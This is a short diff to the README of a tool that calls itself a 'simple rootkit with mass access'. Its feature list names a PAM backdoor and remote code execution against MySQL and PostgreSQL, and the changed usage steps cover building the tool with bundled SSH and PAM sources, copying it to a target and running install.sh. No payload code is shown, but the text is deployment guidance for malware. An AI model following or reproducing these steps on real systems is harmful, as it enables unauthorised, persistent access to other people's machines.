@@ -33,18 +33,17 @@ Simple rootkit with mass access:
 - PAM Backdoor
 - RCE MySQL/PG
 
-## Install
+## Pre
 ```
-cd ./PRE
+cd ./pre
 ./pre.sh
 cd -
 ```
 
+## Usage 
 Copy CLIENT to ./src/CLIENT/
-
-Put needed SSH and PAM version into ./src/
-
-Copy to target
+Put needed SSH and PAM version into ./src/SSH/ and ./src/PAM/
+Copy folder to target
 ```
 ./install.sh
 ```
